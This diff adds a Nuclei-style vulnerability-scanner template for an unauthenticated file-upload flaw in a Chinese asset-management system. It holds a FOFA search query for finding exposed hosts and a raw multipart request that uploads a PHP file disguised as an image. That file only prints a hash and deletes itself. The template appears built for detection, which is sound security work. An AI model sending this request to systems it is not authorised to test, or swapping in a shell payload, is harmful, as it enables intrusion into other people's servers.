@@ -1,0 +1,50 @@
+id: zgy-mobilefront2-fileupload
+
+info:
+  name: 资产管理运营系统mobilefront2接口处存在前台文件上传漏洞
+  author: kingkong
+  severity: critical
+  metadata:
+    fofa-query: body="media/css/uniform.default.css" && body="资管云"
+  tags: 百易云资产管理运营系统
+
+http:
+  - raw:
+      - |
+        POST /mobilefront/c/2.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------------------289666258334735365651210512949
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        X-Requested-With: XMLHttpRequest
+        Content-Length: 35827
+
+        -----------------------------289666258334735365651210512949
+        Content-Disposition: form-data; name="file1"; filename="1.php"
+        Content-Type: image/png
+
+        <?php echo md5(123456);@unlink(__FILE__);?>
+        -----------------------------289666258334735365651210512949--
+
+      - |
+        GET /mobilefront/c/images2/{{fileUrl}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+              - 'status_code_1 == 200'
+              - 'status_code_2 == 200'
+              - 'contains(body_2,"e10adc3949ba59abbe56e057f20f883e")'
+        condition: and
+
+    extractors:
+      - type: regex
+        name: fileUrl
+        part: body_1
+        group: 1
+        regex:
+          - ([0-9]{11}.php)
+        internal: true
